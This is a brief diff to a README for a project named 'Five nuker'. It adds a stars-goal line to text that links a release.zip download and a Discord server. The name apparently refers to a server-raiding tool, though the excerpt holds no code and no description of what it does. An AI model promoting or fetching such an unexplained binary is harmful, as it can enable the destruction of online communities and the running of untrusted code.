@@ -1,5 +1,7 @@
 # Five nuker | Download [here](https://github.com/glitch65/Five-nuker/raw/Rework/release.zip)
 
+# Next update at 65 stars!
+
 # ❓ Have any questions or problems? Contact us to discord server or create an issue
 > Our Discord: https://discord.gg/QTDXqt8PA8
 
